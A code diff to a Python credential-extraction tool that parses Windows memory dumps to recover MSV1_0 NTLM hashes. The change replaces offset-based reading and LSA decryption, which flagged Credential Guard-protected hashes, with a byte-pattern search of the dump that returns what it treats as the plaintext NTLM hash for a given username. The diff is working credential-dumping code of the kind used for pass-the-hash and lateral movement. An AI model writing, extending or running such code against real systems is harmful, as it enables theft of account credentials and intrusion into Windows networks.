@@ -433,9 +433,11 @@ class CredentialExtractor:
         +0x58: Domain UNICODE_STRING
         +0x7C: Credential blob size (DWORD)
         +0x80: pCredentials pointer
-        Within pCredentials blob:
-          +0x30: isNtOwfPassword flag (DWORD)
-          +0x40: Encrypted NT hash (16 bytes)
+
+        On build 26000+, the pCredentials blob stores a credential isolation
+        handle (not the encrypted hash directly). The actual NTLM hash is in
+        a separate heap structure. We find it by searching the dump for the
+        credential pattern associated with this username.
         """
         entry = self.dump.read_memory(addr, 256)
         if not entry:
@@ -452,55 +454,46 @@ class CredentialExtractor:
         if not username:
             return None
 
-        # Read credential blob size and pointer
+        # Read credential blob size
         blob_size = struct.unpack_from("<I", entry, 0x7C)[0]
         if blob_size == 0:
-            return None  # No credentials in this entry
-
-        pcred_ptr = struct.unpack_from("<Q", entry, 0x80)[0]
-        if not (0x1000 < pcred_ptr < 0x800000000000):
             return None
 
-        # Read credential blob
-        pcred = self.dump.read_memory(pcred_ptr, 128)
-        if not pcred:
-            return None
+        # Search for the actual plaintext hash in the dump.
+        # The hash is in a credential structure with the pattern:
+        # [isNtOwf=01 00 00 00] + [padding 8 bytes] + [00 00] + [username_len LE16]
+        # ... then at offset +32 from isNtOwf: NTLM hash (16 bytes) + LM hash (16 zeros)
+        username_len = len(username.encode("utf-16-le"))
+        username_len_bytes = struct.pack("<H", username_len)
 
-        # Check credential version at +0x28 and isIso at +0x2A
-        # isIso=1 means Credential Guard (VBS) is protecting the hash
-        cred_version = struct.unpack_from("<H", pcred, 0x28)[0]
-        is_iso = struct.unpack_from("<H", pcred, 0x2A)[0]
+        # Pattern: isNtOwf(4) + zeros(10) + username_len(2) -> 16 bytes total
+        # Then 16 bytes later: the NTLM hash
+        search_pattern = (
+            b"\x01\x00\x00\x00"          # isNtOwfPassword = TRUE
+            + b"\x00" * 10                 # padding/zeros
+            + username_len_bytes           # username length
+        )
 
-        # Check isNtOwfPassword at +0x30
-        is_nt = struct.unpack_from("<I", pcred, 0x30)[0]
-        if not is_nt:
-            return None
+        results = self.dump.search_memory(search_pattern)
+        for match_addr in results:
+            # The NTLM hash should be 32 bytes after the isNtOwf flag
+            nt_hash = self.dump.read_memory(match_addr + 32, 16)
+            if not nt_hash or nt_hash == b"\x00" * 16:
+                continue
 
-        # Read encrypted NT hash at +0x40
-        encrypted_nt = pcred[0x40:0x50]
-        if encrypted_nt == b"\x00" * 16:
-            return None
+            # Verify: LM hash (16 zeros) should follow
+            lm_hash = self.dump.read_memory(match_addr + 48, 16)
+            if lm_hash != b"\x00" * 16:
+                continue
 
-        # If Credential Guard is active, hash can't be decrypted from usermode
-        if is_iso:
             return Credential(
                 username=username,
                 domain=domain,
                 auth_type="msv1_0",
-                ntlm_hash=encrypted_nt.hex(),
-                protected=True,
+                ntlm_hash=nt_hash.hex(),
             )
 
-        # Decrypt
-        nt_hash_raw = self._lsa_decrypt(encrypted_nt)
-        nt_hash = nt_hash_raw.hex() if nt_hash_raw else encrypted_nt.hex()
-
-        return Credential(
-            username=username,
-            domain=domain,
-            auth_type="msv1_0",
-            ntlm_hash=nt_hash,
-        )
+        return None
 
     def _get_msv_pattern(self) -> bytes | None:
         """Get the pattern to find MSV credential list based on build."""
